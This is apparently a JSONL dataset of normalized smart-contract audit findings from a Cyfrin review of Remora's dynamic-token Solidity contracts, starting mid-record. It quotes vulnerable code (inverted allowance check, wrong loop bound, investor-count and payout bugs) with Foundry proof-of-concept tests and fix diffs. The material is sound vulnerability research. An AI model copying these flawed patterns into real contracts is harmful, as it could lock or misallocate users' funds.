{"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-006", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 6, "page_start": null, "title": "Updating the entity allowance when the individual belongs to a group that has multiple catalysts for different entities can result in mistakenly modifying the allowance of entities where the individual is not even part of", "short_summary": null, "description_md": null, "full_markdown": "### Updating the entity allowance when the individual belongs to a group that has multiple catalysts for different entities can result in mistakenly modifying the allowance of entities where the individual is not even part of\n\n**Description:** The problem is that entities that have nothing to do with either the sender or the receiver can end up getting their allowances modified or causing the tx to revert.\n\nThe system allows to register:\n- Individuals who belong to at most one group, or none.\n- Groups with multiple individuals\n- Entities with multiple individuals but only one catalyst.\n- Each group can have multiple individuals who are catalysts for different entities\n- Individuals in one group don't necessarily belong to all the same entities that the rest of the individuals belong to\n- One investor can be the catalyst for multiple entities.\n\nThis combination of possibilities allows for a scenario as follows:\n\n| Entity | Investors | Catalyst |\n|---|---|---|\n| EntityA | InvestorA, InvestorB | InvestorB |\n| EntityB | InvestorB, InvestorC | InvestorB |\n| EntityC | InvestorA, InvestorC | InvestorA |\n| EntityD | InvestorB, InvestorC | InvestorB |\n\n\n| Group | Investors | groups.numOfCatalysts |\n|---|---|---|\n| GroupA | InvestorA, InvestorB | 4 |\n| GroupB | InvestorC, InvestorD | 0 |\n\n\n| Investors | individualData.numOfCatalysts |\n| --|---|\n| InvestorA | 1 |\n| InvestorB | 3 |\n| InvestorC | 0 |\n| InvestorD| 0 |\n\n\nUsing the previous configuration, a transfer `from` InvestorA will end up affecting entityB and entityD because InvestorA and investorB are in the same group, and InvestorB is the catalyst on EntityB and EntityD (where InvestorC and InvestorD are part of and have nothing to do with InvestorA).\n\nThe issue occurs in these blocks of code on the `FiveFiftyRule::canTransfer` function:\n```solidity\n    function canTransfer(address from, address to, uint256 amount) external returns (bool) {\n        ...\n\n            if (iFrom.isEntity) {\n                entityData[from].allowance += SafeCast.toUint64(amount);\n//@audit-info => If `from` is on a group and that group has multiple catalysts!\n            } else if (gId != 0 && groups[gId].numCatalyst != 0) {\n                //@audit-info => iterates over ALL the individuals of the group `from` belongs to!\n                uint256 len = groups[gId].individuals.length;\n                for (uint256 i; i<len; ++i) {\n                    address ind = groups[gId].individuals[i];\n//@audit-issue => ENTERS If the current individual of the group (doesn't matter if this individual is the `from`) is a catalyst on at least one entity\n@>                  if (individualData[ind].numCatalyst != 0)\n                        _updateEntityAllowance(true, ind, amount);\n                }\n            }\n        ...\n\n    function _updateEntityAllowance(bool add, address inv, uint256 amount) internal returns (bool) {\n//@audit-info => total times the individual is a catalyst on != entities!\n        uint8 numCatalyst = individualData[inv].numCatalyst;\n\n//@audit-info => Entities the individual belongs to!\n        uint256 len = findEntity[inv].length;\n\n //@audit-info => iterates over the entities the individual belongs to\n        for (uint256 i; i<len; ++i) {\n//@audit-info => if individual is not a catalyst on any entity, break out of the loop!\n            if (numCatalyst == 0) break;\n\n//@audit-info => Loads the entity data the individual belongs to on the current indx being iterated\n            EntityData storage aData = entityData[findEntity[inv][i]];\n\n//@audit-info => if the catalyst of the entity is not the investor, continue to the next entity!\n            if (aData.catalyst != inv) continue;\n\n //@audit-info => If reaches here it means the investor is the catalyst of the entity!\n\n            --numCatalyst;\n\n            uint64 adjusted_amt = SafeCast.toUint64(\n                (REMORA_PERCENT_DENOMINATOR / aData.equity) * amount\n            );\n//@audit-issue => Modifies allowance or could cause a revert on an entity that has nothing to do with the actual `from` individual because the catalyst of that entity belonged to the same group as the `from` individual, which caused execution to get here, regardless that `from` individual is not even part of the entity being modified\n            if (add) aData.allowance += adjusted_amt;\n            else if (adjusted_amt > aData.allowance) return false;\n            else aData.allowance -= adjusted_amt;\n        }\n        return true;\n    }\n\n```\n\n\n**Impact:** This bug can lead to two different paths:\n1. On the sender - When ALL the entities have enough allowance, then the allowances for entities where the individual doesn't belong can result in being mistakenly modified.\n2. On the receiver - When one of the entities doesn't have enough allowance, the tx will revert.\n\n**Recommended Mitigation:** Consider refactoring the update of allowances to entities so that they do not fall in this scenario. Consider not updating the allowances of entities where the `from` or `to` are not part of.\n\n**Remora:** Acknowledged. Groups should be seen as individuals, so if individual A and B are in the same group, but are in different entities, either of their transfers should affect all entities that are tied to that group one way or another.\n\n**Cyfrin:** Verified.\n\n\\clearpage\n", "severity": "High", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-007", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 7, "page_start": null, "title": "Self transfer of all child tokens results in decement of `ChildToken.totalInvestors` storage variable", "short_summary": null, "description_md": null, "full_markdown": "### Self transfer of all child tokens results in decement of `ChildToken.totalInvestors` storage variable\n\n**Description:** Similar to Issue [*Frontrunning call to `ChildToken::resolveUser` and transferring all of the oldUser's `childToken` balance causes the `totalInvestor` counter to be decremented twice*](#frontrunning-call-to-childtokenresolveuser-and-transferring-all-of-the-oldusers-childtoken-balance-causes-the-totalinvestor-counter-to-be-decremented-twice), if `user` calls `ChildToken::transfer(user, <balance of user>)` this will result in `totalInvestors` being decremented.\n\nThis is because the override of `_update` determines the decrements/increments based on the balance _before_ the transfer.\n\n```solidity\n    function _update(\n        address from,\n        address to,\n        uint256 value\n    ) internal override {\n@1>     if (from != address(0) && balanceOf(from) - value == 0) --totalInvestors;\n@2>     if (to != address(0) && balanceOf(to) == 0) ++totalInvestors;\n...\n```\n\n- Line `@1>` causes the `totalInvestors` to be decremented, but\n- Line `@2>` does not cause an increment since `balanceOf(to)` is the before-transfer balance\n\n\n**Impact:** The impact is minimal in most cases, as `totalInvestors` is only used for informational purposes.\nHowever, if it is done enough times it will lead to underflows precisely when:\n- `totalInvestors == 0`, and\n- a user is transferring all their tokens to another user\n\n**Proof of Concept:** Add the following test to `CentralTokenTest.t.sol`\n\n```solidity\n\n    function test_cyfrin_selfTransferDecrements() public {\n        address user = getDomesticUser(1);\n        uint32 DEFAULT_LOCK_TIME = 365 days;\n\n        // Seed: old user has 3 tokens (locked by default on mint)\n        centralTokenProxy.mint(address(this), uint64(3));\n        centralTokenProxy.dynamicTransfer(user, 3);\n        assertEq(d_childTokenProxy.balanceOf(user), 3);\n        assertEq(d_childTokenProxy.totalInvestors(), 1);\n\n        vm.warp(block.timestamp + DEFAULT_LOCK_TIME); // warp to unlock tokens\n        vm.prank(user);\n        d_childTokenProxy.transfer(user, 3);\n\n        assertEq(d_childTokenProxy.totalInvestors(), 0);\n        assertEq(d_childTokenProxy.balanceOf(user), 3);\n\n        // Do it one more time and we get a revert\n        vm.warp(block.timestamp + DEFAULT_LOCK_TIME);  // warp to unlock tokens\n        vm.prank(user);\n        vm.expectRevert(); // expect underflow\n        d_childTokenProxy.transfer(user, 3);\n    }\n```\n\n**Recommended Mitigation:** If `from == to` do nothing to the investor count.\n\n```diff\n+       if (from != to) {\n            if (from != address(0) && balanceOf(from) - value == 0) --totalInvestors;\n            if (to != address(0) && balanceOf(to) == 0) ++totalInvestors;\n+       }\n\n        super._update(from, to, value);\n```\n\n**Remora:** Fixed at commit [b612c87](https://github.com/remora-projects/remora-dynamic-tokens/commit/b612c8735b9da1e563af7b0071f3da0c67d60702).\n\n**Cyfrin:** Verified. `totalInvestors` counter is not modified if `from` and `to` are the same address.\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-008", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 8, "page_start": null, "title": "After disabling burning with `CentralToken::disableBurning` calling `PaymentSettler::enableBurning` leads to stuck funds", "short_summary": null, "description_md": null, "full_markdown": "### After disabling burning with `CentralToken::disableBurning` calling `PaymentSettler::enableBurning` leads to stuck funds\n\n**Description:** Burning of child tokens can be disabled, even after `PaymentSettler::enableBurning(...)` is called by and admin calling `CentralToken::disableBurning()` directly.\n\nThe correct way to re-enable burning is to call `CentralToken::enableBurning(burnPayout)` (even though the `burnPayout` parameter is ignored in this case).\n\nHowever, a mistake that could occur is that admin calls `PaymentSettler::enableBurning()` instead. All though this may not be expected, this succeeds because there are no checks against the `TokenData` for  central token and instead, these checks are deferred to the external call to `CentralToken.enableBurning` on [PaymentSettler.sol#L184](https://github.com/remora-projects/remora-dynamic-tokens/blob/6365a9e970758605f973ce0319236805e4188986/contracts/CoreContracts/PaymentSettler.sol#L184).\n\nUnfortunately the logic of `CentralToken::enableBurning` will _overwrite_ the `totalBurnPayout` when called from the `PaymentSettler` contract.\n\n```solidity\n    function enableBurning(uint64 burnPayout) external nonReentrant {\n        address sender = _msgSender();\n        if (sender != paymentSettler)\n            _checkCanCall(sender, _msgData());\n@>      else totalBurnPayout = burnPayout;\n    ...\n```\n\n- The value of each token is calculated as `totalBurnPayout / preBurnSupply`\n- Let `B1`/`B2` be the funds added on the first/second call to `PaymentSettler::enableBurning`\n- Let `S` be the `preBurnSupply`\n- Assume `x` tokens were burned before the disable. Assume `x < S`\n- Assume the remaining `S - x` tokens are burned after re-enable\n- Then total value of all burned tokens is  `(x * B1 / S) + (S - x)*B2 / S`\n- Yet the total value put into `PaymentSettler` for burning was `B1 + B2`\n\nThe stablecoin value left in the `PaymentSettler` contract\n\n```\n   (B1 + B2) - (x * B1 / S + (S - x)*B2/S)\n== (B1 + B2) - (x * B1 / S + S * B2 / S - x * B2 / S)\n== (B1 + B2) - (x/S* (B1 - B2) + B2)\n== B1 - x/S * (B1 - B2)\n```\n\n1. If `B1 - B2 < 0` then this is clearly positive\n2. If `B1 - B2 > 0` then the maximum value of `x/S * (B1 - B2)` happens when `B2 == 0`. But since `x/S < 1` we have `B1 - x/S*B1 > 0`\n\nThus, funds will always become stuck in the contract.\n\n**Impact:** Funds become stuck in the contract when burning is disabled and then re-enabled with `PaymentSettler::enableBurning`\n\n**Proof of Concept:** Add the following to `PaymentSettlerTest.t.sol` Assert statements will hold even if constants (in capital letters) are changed.\n\n```solidity\n    function test_cyfrin_EnableAfterDisableLeadsToStuckFunds() public {\n        address user0 = getDomesticUser(0);\n        address user1 = getDomesticUser(1);\n        uint64 BURN_FUNDS_0 = 1_000_000e6;\n        uint64 BURN_FUNDS_1 = 700_000e6;\n\n        uint64 INITIAL_SUPPLY = 10_000;\n        uint64 BURN_AMOUNT = 3000;\n\n        centralTokenProxy.mint(address(this), INITIAL_SUPPLY);\n        centralTokenProxy.dynamicTransfer(user0, BURN_AMOUNT);\n        centralTokenProxy.dynamicTransfer(user1, INITIAL_SUPPLY - BURN_AMOUNT);\n\n        (uint128 usdBal0 , , bool burnEnabled0,) = paySettlerProxy.tokenData(address(centralTokenProxy));\n        assertEq(usdBal0, 0);\n        assertEq(burnEnabled0, false);\n\n        // initiateBurning\n        paySettlerProxy.initiateBurning(address(centralTokenProxy));\n        skip(1 days + 1);\n\n        IERC20(address(stableCoin)).approve(address(paySettlerProxy), type(uint256).max);\n        paySettlerProxy.enableBurning(address(centralTokenProxy), address(this), BURN_FUNDS_0);\n        (uint128 usdBal1,,bool burnEnabled1,) = paySettlerProxy.tokenData(address(centralTokenProxy));\n        assertEq(usdBal1, 1_000_000e6);\n        assertEq(centralTokenProxy.totalSupply(), INITIAL_SUPPLY);\n        assertEq(centralTokenProxy.preBurnSupply(), INITIAL_SUPPLY);\n        assertEq(centralTokenProxy.totalBurnPayout(), BURN_FUNDS_0);\n        assertEq(burnEnabled1, true);\n\n        vm.startPrank(user0);\n        d_childTokenProxy.burn(); // burns INITIAL_SUPPLY - BURN_AMOUNT tokens\n        vm.stopPrank();\n\n        (uint128 usdBal2,,,) = paySettlerProxy.tokenData(address(centralTokenProxy));\n        assertEq(usdBal2, BURN_FUNDS_0 - BURN_AMOUNT * BURN_FUNDS_0 / INITIAL_SUPPLY);\n        assertEq(centralTokenProxy.totalSupply(), INITIAL_SUPPLY - BURN_AMOUNT);\n        assertEq(centralTokenProxy.preBurnSupply(), INITIAL_SUPPLY);\n        assertEq(centralTokenProxy.totalBurnPayout(), BURN_FUNDS_0);\n\n        // Disable Burning\n        centralTokenProxy.disableBurning();\n        (,,bool burnEnabled2_5,) = paySettlerProxy.tokenData(address(centralTokenProxy));\n        assertEq(burnEnabled2_5, true); // PaymentSettler still reports that the burn is enabled\n\n        paySettlerProxy.enableBurning(address(centralTokenProxy), address(this), BURN_FUNDS_1);\n        (uint128 usdBal3 , , , bool burnEnabled3) = paySettlerProxy.tokenData(address(centralTokenProxy));\n        assertEq(usdBal3, usdBal2 + BURN_FUNDS_1);\n        assertTrue(burnEnabled3);\n        uint256 totalSupply3 = centralTokenProxy.totalSupply();\n        uint64  preBurnSupply3 = centralTokenProxy.preBurnSupply();\n        uint64  totalBurnPayout3 = centralTokenProxy.totalBurnPayout();\n        uint256 valueOfTokens = totalSupply3 * totalBurnPayout3 / preBurnSupply3;\n\n        assertEq(totalSupply3, INITIAL_SUPPLY - BURN_AMOUNT);\n        assertEq(preBurnSupply3, INITIAL_SUPPLY);\n        assertEq(totalBurnPayout3, BURN_FUNDS_1);\n\n        vm.startPrank(user1);\n        d_childTokenProxy.burn(); // burn all remaining tokens\n        vm.stopPrank();\n\n        (uint128 usdBalEnd , , , ) = paySettlerProxy.tokenData(address(centralTokenProxy));\n        assertEq(usdBalEnd, usdBal2 + BURN_FUNDS_1 - valueOfTokens);\n        assertEq(int64(uint64(usdBalEnd)), int64(BURN_FUNDS_0) - int64(BURN_AMOUNT) * (int64(BURN_FUNDS_0) - int64(BURN_FUNDS_1))/ int64(INITIAL_SUPPLY));\n        assertEq(centralTokenProxy.totalSupply(), 0);\n    }\n```\n\n**Recommended Mitigation:** It is recommended that re-enabling burning via `PaymentSettler::enableBurning` is completely disabled perhaps by just adding a check\n\n```diff\n+    error TokenBurningAlreadyEnabled();\n```\n\n```diff\n    function enableBurning(\n        address token,\n        address fundingWallet,\n        uint64 value\n    ) external nonReentrant restricted {\n        if (value == 0) revert InvalidValuePassed();\n        TokenData storage t = tokenData[token];\n+       if (t.burnEnabled) revert TokenBurningAlreadyEnabled();\n        if (!t.active) revert InvalidTokenAddress();\n...\n```\n\n**Remora:** Fixed at commit [45e9745](https://github.com/remora-projects/remora-dynamic-tokens/commit/45e974546e47d4e8248374b31f0cc01d07dcf04b)\n\n**Cyfrin:** Verified. Added a check to prevent enabling burning more than once.\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-009", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 9, "page_start": null, "title": "Resolving a frozen investor causes all the pending payouts for the entire time the investor was frozen to be lost", "short_summary": null, "description_md": null, "full_markdown": "### Resolving a frozen investor causes all the pending payouts for the entire time the investor was frozen to be lost\n\n**Description:** When an investor is frozen, they do not receive payouts while the freeze is active. However, once the sanction is lifted, the investor is entitled to receive the accumulated payouts for the entire duration of the freeze.\n\nResolving a frozen user does not unfreeze the investor before resolving the pending payouts. This means that the payouts of the investor will be calculated up to the `payoutIndex` at which they were frozen; any subsequent payouts will not be included in the calculation.\n```solidity\n//ChildToken.sol//\n    function resolveUser(address oldAddress, address newAddress) external nonReentrant restricted {\n        ...\n        _resolvePay(oldAddress, newAddress); // moves any unclaimed payouts to new account\n        ...\n    }\n\n//DividendManager.sol//\n    function _resolvePay(address oldAddress, address newAddress) internal {\n//@audit => Payouts as calculated on payoutBalance() from oldAddress are migrated to newAddress\n@>      _getHolderManagementStorage()._resolvedPay[newAddress] = SafeCast.toUint128(_claimPayout(oldAddress));\n        emit PaymentResolved(oldAddress, newAddress);\n    }\n\n    function _claimPayout(\n        address holder\n    ) internal returns (uint256 payoutAmount) {\n        HolderManagementStorage storage $ = _getHolderManagementStorage();\n        payoutAmount = payoutBalance(holder);\n\n        ...\n    }\n\n    function payoutBalance(address holder) public returns (uint256) {\n        ...\n\n        uint256 payoutAmount;\n//@audit => Payouts for frozen investors are paid out up to the index when they were frozen\n @>     uint16 payRangeStart = rHolderStatus.isFrozen\n            ? rHolderStatus.frozenIndex - 1\n            : currentPayoutIndex - 1;\n        ...\n        for (uint16 i = payRangeStart; i >= payRangeEnd; --i) {\n            ...\n        }\n\n        ...\n    }\n```\n\nGiven that resolving a user causes the entire balance to be transferred to the new address, the `oldAddress` will get its user data deleted because on the `DividenManager::_updateHolders`, the `from` (oldAddress) won't have any balance, any payouts, nor calculatedPayout, both of them were reset to 0 in the call to `_claimPayout()` triggered from `_resolvePay()`\n```solidity\n//ChildToken.sol//\n    function resolveUser(address oldAddress, address newAddress) external nonReentrant restricted {\n        ...\n        _resolvePay(oldAddress, newAddress); // moves any unclaimed payouts to new account\n        ...\n//@audit => Transfer all the balance of the oldAddress\n        uint256 value = balanceOf(oldAddress);\n        _validateBalance(false, false, oldAddress, value);\n        _validateCompliance(false, true, oldAddress, newAddress, value);\n@>      super._transfer(oldAddress, newAddress, value); // tokens already locked with _newAccountSameLocks\n    }\n\n\n\n```\n\nThis means the new address will receive all the old address tokens, but the payouts for the duration of the freeze on the old address will be lost.\n\n**Impact:** Resolving a frozen user causes all their pending payouts for the duration of their freeze to be lost.\n\n\n**Recommended Mitigation:** Add to the `ChildToken::resolveUser` logic to verify if the oldAddress is frozen; if so, unfreeze it before resolving the pending payments. And, at the end of the execution, consider freezing the new address in case the old address was frozen.\n\n**Remora:** Fixed at commit [c729f6e](https://github.com/remora-projects/remora-dynamic-tokens/commit/c729f6eb61235efd02095cecff3b2b3a82956257)\n\n**Cyfrin:** Verified. Added a validation before calculating pending payouts to check if the `oldAddress` is frozen. If so, `oldAddress` is unfrozen, and `newAddress` is frozen. This allows pending payouts for the `oldAddress` to be calculated until the current `payoutIndex`.\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-010", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 10, "page_start": null, "title": "Allowance check in `FiveFiftyRule::canTransfer` is inverted", "short_summary": null, "description_md": null, "full_markdown": "### Allowance check in `FiveFiftyRule::canTransfer` is inverted\n\n**Description:** The following snippet from `FiveFiftyRule::canTransfer` has inverted logic.\n\n```solidity\n            if (iTo.isEntity) { // if entity\n@>              if (entityData[to].allowance <= amount) {\n                    entityData[to].allowance -= SafeCast.toUint64(amount);\n\n                    iTo.lastBalance += SafeCast.toUint64(amount);\n                    emit FiveFiftyApproved(from, to, amount);\n                    return true;\n                } else revert ();\n            }\n```\n\nThis is also present in `FiveFiftyRule::checkCanTransfer`.\n\n**Impact:** No transfers to entities are possible except in the rare cases that `allowance == amount`\nIn the other two cases the function will revert, but for different reasons.\n- If `allowance  > amount` then function will revert due to the else-branch\n- If `allowance < amount` then the function will revert due to underflow\n\n**Recommended Mitigation:**\n```diff\n            if (iTo.isEntity) { // if entity\n-               if (entityData[to].allowance <= amount) {\n+               if (entityData[to].allowance >= amount) {\n                    entityData[to].allowance -= SafeCast.toUint64(amount);\n```\n\n```diff\n        if (iData.isEntity)\n-           return entityData[to].allowance <= amount;\n+           return entityData[to].allowance >= amount;\n```\n\n**Remora:** Fixed at commit [a69e893](https://github.com/remora-projects/remora-dynamic-tokens/commit/a69e89357e5180150894b8d8b24f273bdf45893c)\n\n**Cyfrin:** Verified. Comparison operator has been inverted to use the correct operator.\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-011", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 11, "page_start": null, "title": "`FiveFiftyRule::_removeFromEntity` will revert or not work in some cases", "short_summary": null, "description_md": null, "full_markdown": "### `FiveFiftyRule::_removeFromEntity` will revert or not work in some cases\n\n**Description:** The marked line in the code below is using the wrong length `len`. It should be `eLen`.\n\n```solidity\n    function _removeFromEntity(\n        address entity,\n        address[] calldata investors\n    ) internal {\n        uint256 len = investors.length;\n        for (uint256 i; i<len; ++i) {\n            address[] storage ens = findEntity[investors[i]];\n            uint256 eLen = ens.length;\n@>          for (uint256 j; j<len; ++j) {\n                if (ens[j] == entity) {\n                    if (j != eLen-1 && eLen > 1)\n                        ens[j] = ens[eLen-1];\n                    ens.pop();\n                    break;\n                }\n            }\n        }\n    }\n```\n\nWhen `len > eLen` this will lead to reverts if the investor is not found when `j < eLen`.\nThe result is spurious reverts.\n\n**Impact:** Functions impacted by the reverts are  `deleteEntity` and `removeFromEntity`.\n\nFor the `removeFromEntity` case it's possible to repeatedly call it where the `investors` parameter is an array of length 1.\n\nHowever, for the `deleteEntity` cases this is not possible. The `investors` parameter must contain all of the investors in the entity. If it does not then `findEntity` mapping will still contain entries that it shouldn't.\n\n**Proof of Concept:** Add this to `FiveFiftyRuleTest.t.sol`\n\n```\nimport \"forge-std/Test.sol\";\n```\n\nand also\n\n```solidity\n    function test_cyfrin_removeEntity_indexBug() public {\n        address user0 = getDomesticUser(0);\n        address user1 = getDomesticUser(1);\n        address user2 = getDomesticUser(2);\n        address entity = getDomesticUser(3);\n\n\n        address[] memory investors = new address[](3);\n        investors[0] = user0;\n        investors[0] = user1;\n        investors[0] = user2;\n\n        fiveFiftyProxy.createEntity(entity, user0, 1e6, 1_000_000, investors);\n\n        address[] memory investorsToRemove = new address[](2);\n        investorsToRemove[0] = user0;\n        investorsToRemove[1] = user1;\n\n        // since investorsToRemove.length == 2 and entities.length == 1 we get a revert\n        vm.expectRevert(stdError.indexOOBError);\n        fiveFiftyProxy.removeFromEntity(entity, investorsToRemove);\n\n    }\n```\n\n**Recommended Mitigation:**\n```diff\n-          for (uint256 j; j<len; ++j) {\n+          for (uint256 j; j<eLen; ++j) {\n```\n\n**Remora**\nFixed at commit [5ed4324](https://github.com/remora-projects/remora-dynamic-tokens/commit/5ed432479dec26cb1bcb7484e765eb7319f76c0a)\n\n**Cyfrin:** Verified.\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
